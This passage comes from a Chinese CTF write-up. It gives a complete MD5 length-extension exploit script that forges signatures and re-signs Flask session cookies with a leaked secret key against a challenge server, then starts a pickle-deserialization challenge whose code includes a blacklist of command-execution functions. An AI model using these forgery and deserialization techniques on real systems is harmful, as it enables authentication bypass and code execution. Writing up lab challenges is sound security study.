class="string">&#x27;/flag&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).<span class="title function_">read</span>()</span><br><span class="line"></span><br><span class="line">def <span class="title function_">init</span>():</span><br><span class="line">    <span class="variable language_">global</span> users, sign_users</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">64</span>):</span><br><span class="line">        username = <span class="title function_">getRandom</span>(<span class="number">8</span>)</span><br><span class="line">        pwd = <span class="title function_">getRandom</span>(<span class="number">16</span>)</span><br><span class="line">        users[username] = pwd</span><br><span class="line">        sign_users[username] = <span class="number">0</span></span><br><span class="line">    users[<span class="string">&quot;student&quot;</span>] = <span class="string">&quot;student&quot;</span></span><br><span class="line">    sign_users[<span class="string">&quot;student&quot;</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">init</span>()</span><br></pre></td></tr></table></figure>
<p>这里需要将每一个用户进行签到成功就可以获取flag，这里将SECRET_KEY给出来的，并且有一个关键函数来对身份进行验证</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">def <span class="title function_">check_sign</span>(sign, username, msg, salt):</span><br><span class="line">    <span class="keyword">if</span> sign == <span class="title function_">md5</span>(salt + msg + username):</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">False</span></span><br></pre></td></tr></table></figure>
<p>salt为随机不知道的值，msg= md5(salt + password.encode())，但是有一个已经知道的账户，通过哈希延长攻击来写脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Any</span>, <span class="type">Dict</span>, <span class="type">List</span></span><br><span class="line"></span><br><span class="line">rotate_amounts = [<span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>,</span><br><span class="line">                  <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>,</span><br><span class="line">                  <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>,</span><br><span class="line">                  <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>]</span><br><span class="line"></span><br><span class="line">constants = [<span class="built_in">int</span>(<span class="built_in">abs</span>(math.sin(i + <span class="number">1</span>)) * <span class="number">2</span> ** <span class="number">32</span>) &amp; <span class="number">0xFFFFFFFF</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line">functions = <span class="number">16</span> * [<span class="keyword">lambda</span> b, c, d: (b &amp; c) | (~b &amp; d)] + \</span><br><span class="line">            <span class="number">16</span> * [<span class="keyword">lambda</span> b, c, d: (d &amp; b) | (~d &amp; c)] + \</span><br><span class="line">            <span class="number">16</span> * [<span class="keyword">lambda</span> b, c, d: b ^ c ^ d] + \</span><br><span class="line">            <span class="number">16</span> * [<span class="keyword">lambda</span> b, c, d: c ^ (b | ~d)]</span><br><span class="line"></span><br><span class="line">index_functions = <span class="number">16</span> * [<span class="keyword">lambda</span> i: i] + \</span><br><span class="line">                  <span class="number">16</span> * [<span class="keyword">lambda</span> i: (<span class="number">5</span> * i + <span class="number">1</span>) % <span class="number">16</span>] + \</span><br><span class="line">                  <span class="number">16</span> * [<span class="keyword">lambda</span> i: (<span class="number">3</span> * i + <span class="number">5</span>) % <span class="number">16</span>] + \</span><br><span class="line">                  <span class="number">16</span> * [<span class="keyword">lambda</span> i: (<span class="number">7</span> * i) % <span class="number">16</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_init_values</span>(<span class="params">A: <span class="built_in">int</span> = <span class="number">0x67452301</span>, B: <span class="built_in">int</span> = <span class="number">0xefcdab89</span>, C: <span class="built_in">int</span> = <span class="number">0x98badcfe</span>, D: <span class="built_in">int</span> = <span class="number">0x10325476</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="keyword">return</span> [A, B, C, D]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">left_rotate</span>(<span class="params">x, amount</span>):</span><br><span class="line">    x &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> ((x &lt;&lt; amount) | (x &gt;&gt; (<span class="number">32</span> - amount))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">padding_message</span>(<span class="params">msg: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    在MD5算法中，首先需要对输入信息进行填充，使其位长对512求余的结果等于448，并且填充必须进行，即使其位长对512求余的结果等于448。</span></span><br><span class="line"><span class="string">    因此，信息的位长（Bits Length）将被扩展至N*512+448，N为一个非负整数，N可以是零。</span></span><br><span class="line"><span class="string">    填充的方法如下：</span></span><br><span class="line"><span class="string">        1) 在信息的后面填充一个1和无数个0，直到满足上面的条件时才停止用0对信息的填充。</span></span><br><span class="line"><span class="string">        2) 在这个结果后面附加一个以64位二进制表示的填充前信息长度（单位为Bit），如果二进制表示的填充前信息长度超过64位，则取低64位。</span></span><br><span class="line"><span class="string">    经过这两步的处理，信息的位长=N*512+448+64=(N+1）*512，即长度恰好是512的整数倍。这样做的原因是为满足后面处理中对信息长度的要求。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    orig_len_in_bits = (<span class="number">8</span> * <span class="built_in">len</span>(msg)) &amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line">    msg += <span class="built_in">bytes</span>([<span class="number">0x80</span>])</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(msg) % <span class="number">64</span> != <span class="number">56</span>:</span><br><span class="line">        msg += <span class="built_in">bytes</span>([<span class="number">0x00</span>])</span><br><span class="line">    msg += orig_len_in_bits.to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">message: <span class="built_in">bytes</span>, A: <span class="built_in">int</span> = <span class="number">0x67452301</span>, B: <span class="built_in">int</span> = <span class="number">0xefcdab89</span>, C: <span class="built_in">int</span> = <span class="number">0x98badcfe</span>, D: <span class="built_in">int</span> = <span class="number">0x10325476</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    message = padding_message(message)</span><br><span class="line">    hash_pieces = get_init_values(A, B, C, D)[:]</span><br><span class="line">    <span class="keyword">for</span> chunk_ofst <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(message), <span class="number">64</span>):</span><br><span class="line">        a, b, c, d = hash_pieces</span><br><span class="line">        chunk = message[chunk_ofst:chunk_ofst + <span class="number">64</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">            f = functions[i](b, c, d)</span><br><span class="line">            g = index_functions[i](i)</span><br><span class="line">            to_rotate = a + f + constants[i] + <span class="built_in">int</span>.from_bytes(chunk[<span class="number">4</span> * g:<span class="number">4</span> * g + <span class="number">4</span>], byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">            new_b = (b + left_rotate(to_rotate, rotate_amounts[i])) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            a, b, c, d = d, new_b, b, c</span><br><span class="line">        <span class="keyword">for</span> i, val <span class="keyword">in</span> <span class="built_in">enumerate</span>([a, b, c, d]):</span><br><span class="line">            hash_pieces[i] += val</span><br><span class="line">            hash_pieces[i] &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(x &lt;&lt; (<span class="number">32</span> * i) <span class="keyword">for</span> i, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(hash_pieces))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_to_hex</span>(<span class="params">digest: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    raw = digest.to_bytes(<span class="number">16</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;:032x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>.from_bytes(raw, byteorder=<span class="string">&#x27;big&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_md5</span>(<span class="params">message: <span class="built_in">bytes</span>, A: <span class="built_in">int</span> = <span class="number">0x67452301</span>, B: <span class="built_in">int</span> = <span class="number">0xefcdab89</span>, C: <span class="built_in">int</span> = <span class="number">0x98badcfe</span>, D: <span class="built_in">int</span> = <span class="number">0x10325476</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> md5_to_hex(md5(message, A, B, C, D))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_attack</span>(<span class="params">message: <span class="built_in">bytes</span>, A: <span class="built_in">int</span> = <span class="number">0x67452301</span>, B: <span class="built_in">int</span> = <span class="number">0xefcdab89</span>, C: <span class="built_in">int</span> = <span class="number">0x98badcfe</span>,</span></span><br><span class="line"><span class="params">               D: <span class="built_in">int</span> = <span class="number">0x10325476</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    hash_pieces = get_init_values(A, B, C, D)[:]</span><br><span class="line">    <span class="keyword">for</span> chunk_ofst <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(message), <span class="number">64</span>):</span><br><span class="line">        a, b, c, d = hash_pieces</span><br><span class="line">        chunk = message[chunk_ofst:chunk_ofst + <span class="number">64</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">            f = functions[i](b, c, d)</span><br><span class="line">            g = index_functions[i](i)</span><br><span class="line">            to_rotate = a + f + constants[i] + <span class="built_in">int</span>.from_bytes(chunk[<span class="number">4</span> * g:<span class="number">4</span> * g + <span class="number">4</span>], byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">            new_b = (b + left_rotate(to_rotate, rotate_amounts[i])) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            a, b, c, d = d, new_b, b, c</span><br><span class="line">        <span class="keyword">for</span> i, val <span class="keyword">in</span> <span class="built_in">enumerate</span>([a, b, c, d]):</span><br><span class="line">            hash_pieces[i] += val</span><br><span class="line">            hash_pieces[i] &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(x &lt;&lt; (<span class="number">32</span> * i) <span class="keyword">for</span> i, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(hash_pieces))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_init_values_from_hash_str</span>(<span class="params">real_hash: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        real_hash: 真实的hash结算结果</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns: 哈希初始化值[A, B, C, D]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    str_list: <span class="type">List</span>[<span class="built_in">str</span>] = [real_hash[i * <span class="number">8</span>:(i + <span class="number">1</span>) * <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    <span class="comment"># 先按照小端字节序将十六进制字符串转换成整数，然后按照大端字节序重新读取这个数字</span></span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">int</span>.from_bytes(<span class="built_in">int</span>(<span class="string">&#x27;0x&#x27;</span> + s, <span class="number">16</span>).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>), byteorder=<span class="string">&#x27;big&#x27;</span>) <span class="keyword">for</span> s <span class="keyword">in</span> str_list]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_md5_attack_materials</span>(<span class="params">origin_msg: <span class="built_in">bytes</span>, key_len: <span class="built_in">int</span>, real_hash: <span class="built_in">str</span>, append_data: <span class="built_in">bytes</span></span>) -&gt; <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        origin_msg: 原始的消息字节流</span></span><br><span class="line"><span class="string">        key_len: 原始密钥（盐）的长度</span></span><br><span class="line"><span class="string">        real_hash: 计算出的真实的hash值</span></span><br><span class="line"><span class="string">        append_data: 需要添加的攻击数据</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns: 发起攻击需要的物料信息</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            &#x27;attack_fake_msg&#x27;: bytes([...]),</span></span><br><span class="line"><span class="string">            &#x27;attack_hash_value&#x27;: str(a1b2c3d4...)</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    init_values = get_init_values_from_hash_str(real_hash)</span><br><span class="line">    <span class="comment"># print([&#x27;&#123;:08x&#125;&#x27;.format(x) for x in init_values])</span></span><br><span class="line">    <span class="comment"># 只知道key的长度，不知道key的具体内容时，任意填充key的内容</span></span><br><span class="line">    fake_key: <span class="built_in">bytes</span> = <span class="built_in">bytes</span>([<span class="number">0xff</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(key_len)])</span><br><span class="line">    <span class="comment"># 计算出加了append_data后的真实填充数据</span></span><br><span class="line">    finally_padded_attack_data = padding_message(padding_message(fake_key + origin_msg) + append_data)</span><br><span class="line">    <span class="comment"># 攻击者提前计算添加了攻击数据的哈希</span></span><br><span class="line">    attack_hash_value = md5_to_hex(md5_attack(finally_padded_attack_data[<span class="built_in">len</span>(padding_message(fake_key + origin_msg)):],</span><br><span class="line">                                              A=init_values[<span class="number">0</span>],</span><br><span class="line">                                              B=init_values[<span class="number">1</span>],</span><br><span class="line">                                              C=init_values[<span class="number">2</span>],</span><br><span class="line">                                              D=init_values[<span class="number">3</span>]))</span><br><span class="line">    fake_padding_data = padding_message(fake_key + origin_msg)[<span class="built_in">len</span>(fake_key + origin_msg):]</span><br><span class="line">    attack_fake_msg = origin_msg + fake_padding_data + append_data</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;attack_fake_msg&#x27;</span>: attack_fake_msg, <span class="string">&#x27;attack_hash_value&#x27;</span>: attack_hash_value&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"><span class="keyword">import</span> requests, json, time</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MockApp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, secret_key</span>):</span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">session_decode</span>(<span class="params">session_cookie_value, secret_key</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span></span><br><span class="line">    app = MockApp(secret_key)</span><br><span class="line">    si = SecureCookieSessionInterface()</span><br><span class="line">    s = si.get_signing_serializer(app)</span><br><span class="line">    <span class="keyword">return</span> s.loads(session_cookie_value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">session_encode</span>(<span class="params">session_cookie_structure, secret_key</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        app = MockApp(secret_key)</span><br><span class="line">        <span class="comment"># session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span></span><br><span class="line">        si = SecureCookieSessionInterface()</span><br><span class="line">        s = si.get_signing_serializer(app)</span><br><span class="line">        <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">req_index</span>(<span class="params">url, cookie</span>):</span><br><span class="line">    <span class="comment"># headers = &#123;&quot;Cookie&quot;: &quot;session=&quot; + cookie&#125;</span></span><br><span class="line">    cookies = &#123;<span class="string">&quot;session&quot;</span>:cookie&#125;</span><br><span class="line">    r = requests.get(url, cookies=cookies).text</span><br><span class="line">    <span class="comment"># print(r)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;签到成功&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r:</span><br><span class="line">        <span class="comment"># print(cookie)</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        req_index(url, cookie)</span><br><span class="line">        <span class="comment"># print(r)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">req_user</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">return</span> json.loads(requests.get(url).text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">req_login</span>(<span class="params">url</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;student&quot;</span>, <span class="string">&quot;password&quot;</span>:<span class="string">&quot;student&quot;</span>&#125;</span><br><span class="line">    cookie = requests.post(url, data).headers[<span class="string">&quot;Set-Cookie&quot;</span>][<span class="number">8</span>:].split(<span class="string">&#x27;;&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># print(cookie)</span></span><br><span class="line">    <span class="keyword">return</span> cookie</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash_Attack</span>(<span class="params">md5_value, key_len, data, attack_data</span>):</span><br><span class="line">    attack_materials = get_md5_attack_materials(data, key_len, md5_value.decode(), attack_data)</span><br><span class="line">    <span class="comment"># print(data)</span></span><br><span class="line">    res = &#123;<span class="string">&quot;username&quot;</span>:attack_data, <span class="string">&quot;msg&quot;</span>:attack_materials[<span class="string">&#x27;attack_fake_msg&#x27;</span>][:-<span class="built_in">len</span>(attack_data)], <span class="string">&quot;sign&quot;</span>:attack_materials[<span class="string">&#x27;attack_hash_value&#x27;</span>].encode()&#125;</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&quot;http://210.44.150.15:49982/&quot;</span></span><br><span class="line">    cookie = req_login(url+<span class="string">&#x27;login&#x27;</span>)</span><br><span class="line">    users = req_user(url+<span class="string">&#x27;users&#x27;</span>)</span><br><span class="line">    secret_key = <span class="string">&quot;Th1s_is_5ecr3t_k3y&quot;</span></span><br><span class="line">    res = session_decode(cookie, secret_key)</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">if</span> users[user] == <span class="number">0</span>:</span><br><span class="line">            res = hash_Attack(res[<span class="string">&quot;sign&quot;</span>], <span class="number">16</span>, res[<span class="string">&quot;msg&quot;</span>]+res[<span class="string">&quot;username&quot;</span>], user.encode())</span><br><span class="line">            res2 = session_encode(res, secret_key)</span><br><span class="line">            <span class="comment"># time.sleep(1)</span></span><br><span class="line">            r = req_index(url, res2)</span><br></pre></td></tr></table></figure>
<h3 id="Week2-dickle"><a href="#Week2-dickle" class="headerlink" title="[Week2]dickle"></a>[Week2]dickle</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">from flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> <span class="type">io</span></span><br><span class="line"></span><br><span class="line"><span class="variable">BLACKLISTED_CLASSES</span> <span class="operator">=</span> [</span><br><span class="line">    <span class="string">&#x27;subprocess.check_output&#x27;</span>,<span class="string">&#x27;builtins.eval&#x27;</span>,<span class="string">&#x27;builtins.exec&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;os.system&#x27;</span>, <span class="string">&#x27;os.popen&#x27;</span>, <span class="string">&#x27;os.popen2&#x27;</span>, <span class="string">&#x27;os.popen3&#x27;</span>, <span class="string">&#x27;os.popen4&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;pickle.load&#x27;</span>, <span class="string">&#x27;pickle.loads&#x27;</span>, <span class="string">&#x27;cPickle.load&#x27;</span>, <span class="string">&#x27;cPickle.loads&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;subprocess.call&#x27;</span>, <span class="string">&#x27;subprocess.check_call&#x27;</span>, <span class="string">&#x27;subprocess.Popen&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;commands.getstatusoutput&#x27;</span>, <span class="string">&#x27;commands.getoutput&#x27;</span>, <span class="string">&#x27;commands.getstatus&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;pty.spawn&#x27;</span>, <span class="string">&#x27;posixfile.open&#x27;</span>, <span class="string">&#x27;posixfile.fileopen&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;__import__&#x27;</span>,<span class="string">&#x27;os.spawn*&#x27;</span>,<span class="string">&#x27;sh.Command&#x27;</span>,<span class="string">&#x27;imp.load_module&#x27;</span>,<span class="string">&#x27;builtins.compile&#x27;</span></span><br><span class="line">    <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;builtins.execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;builtins.open&#x27;</span>, <span class="string">&#x27;builtins.file&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;os.fdopen&#x27;</span>, <span class="string">&#x27;os.tmpfile&#x27;</span>, <span class="string">&#x27;os.fchmod&#x27;</span>, <span class="string">&#x27;os.fchown&#x27;</span>, <span class="string">&#x27;os.open&#x27;</span>, <span class="string">&#x27;os.openpty&#x27;</span>, <span class="string">&#x27;os.read&#x27;</span>, <span class="string">&#x27;os.pipe&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;os.chdir&#x27;</span>, <span class="string">&#x27;os.fchdir&#x27;</span>, <span class="string">&#x27;os.chroot&#x27;</span>, <span class="string">&#x27;os.chmod&#x27;</span>, <span class="string">&#x27;os.chown&#x27;</span>, <span class="string">&#x27;os.link&#x27;</span>, <span class="string">&#x27;os.lchown&#x27;</span>, <span class="string">&#x27;os.listdir&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;os.lstat&#x27;</span>, <span class="string">&#x27;os.mkfifo&#x27;</span>, <span class="string">&#x27;os.mknod&#x27;</span>, <span class="string">&#x27;os.access&#x27;</span>, <span class="string">&#x27;os.mkdir&#x27;</span>, <span class="string">&#x27;os.makedirs&#x27;</span>, <span class="string">&#x27;os.readlink&#x27;</span>, <span class="string">&#x27;os.remove&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;os.removedirs&#x27;</span>, <span class="string">&#x27;os.rename&#x27;</span>, <span class="string">&#x27;os.renames&#x27;</span>, <span class="string">&#x27;os.rmdir&#x27;</span>, <span class="string">&#x27;os.tempnam&#x27;</span>, <span class="string">&#x27;os.tmpnam&#x27;</span>, <span class="string">&#x27;os.unlink&#x27;</span>, <span class="string">&#x27;os.walk&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;os.execl&#x27;</span>, <span class="string">&#x27;os.execle&#x27;</span>, <span class="string">&#x27;os.execlp&#x27;</span>, <span class="string">&#x27;os.execv&#x27;</span>, <span class="string">&#x27;os.execve&#x27;</span>, <span class="string">&#x27;os.dup&#x27;</span>, <span class="string">&#x27;os.dup2&#x27;</span>, <span class="string">&#x27;os.execvp&#x27;</span>, <span class="string">&#x27;os.execvpe&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;os.fork&#x27;</span>, <span class="string">&#x27;os.forkpty&#x27;</span>, <span class="string">&#x27;os.kill&#x27;</span>, <span class="string">&#x27;os.spawnl&#x27;</span>, <span class="string">&#x27;os.spawnle&#x27;</span>, <span class="string">&#x27;os.spawnlp&#x27;</span>, <span class="string">&#x27;os.spawnlpe&#x27;</span>, <span class="string">&#x27;os.spawnv&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;os.spawnve&#x27;</span>, <span class="string">&#x27;os.spawnvp&#x27;</span>, <span class="string">&#x27;os.spawnvpe&#x27;</span>, <span class="string">&#x27;pickle.load&#x27;</span>, <span class="string">&#x27;pickle.loads&#x27;</span>, <span class="string">&#x27;cPickle.load&#x27;</span>, <span class="string">&#x27;cPickle.loads&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;subprocess.call&#x27;</span>, <span class="string">&#x27;subprocess.check_call&#x27;</span>, <span class="string">&#x27;subprocess.check_output&#x27;</span>, <span class="string">&#x27;subprocess.Popen&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;commands.getstatusoutput&#x27;</span>, <span class="string">&#x27;commands.getoutput&#x27;</span>, <span class="string">&#x27;commands.getstatus&#x27;</span>, <span class="string">&#x27;glob.glob&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;linecache.getline&#x27;</span>, <span class="string">&#x27;shutil.copyfileobj&#x27;</span>, <span class="string">&#x27;shutil.copyfile&#x27;</span>, <span class="string">&#x27;shutil.copy&#x27;</span>, <span class="string">&#x27;shutil.copy2&#x27;</span>, <span class="string">&#x27;shutil.move&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;shutil.make_archive&#x27;</span>, <span class="string">&#x27;popen2.popen2&#x27;</span>, <span class="string">&#x27;popen2.popen3&#x27;</span>, <span class="string">&#x27;popen2.popen4&#x27;</span>, <span class="string">&#x27;timeit.timeit&#x27;</span>, <span class="string">&#x27;sys.call_tracing&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;code.interact&#x27;</span>, <span class="string">&#x27;code.compile_command&#x27;</span>, <span class="string">&#x27;codeop.compile_command&#x27;</span>, <span class="string">&#x27;pty.spawn&#x27;</span>, <span class="string">&#x27;posixfile.open&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;posixfile.fileopen&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SafeUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    def <span class="title function_">find_class</span><span class="params">(self, <span class="keyword">module</span>, name)</span>:</span><br><span class="line">        <span class="keyword">if</span> f<span class="string">&quot;&#123;module&#125;.&#123;name&#125;&quot;</span> in BLACKLISTED_CLASSES:</span><br><span class="line">            raise pickle.UnpicklingError(<span class="string">&quot;Forbidden class: %s.%s&quot;</span> % (<span class="keyword">module</span>, name))</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>().find_class(<span class="keyword">module</span>, name)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>])</span><br><span class="line">def <span class="title function_">index</span><span class="params">()</span>:</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        encoded_data = request.form[<span 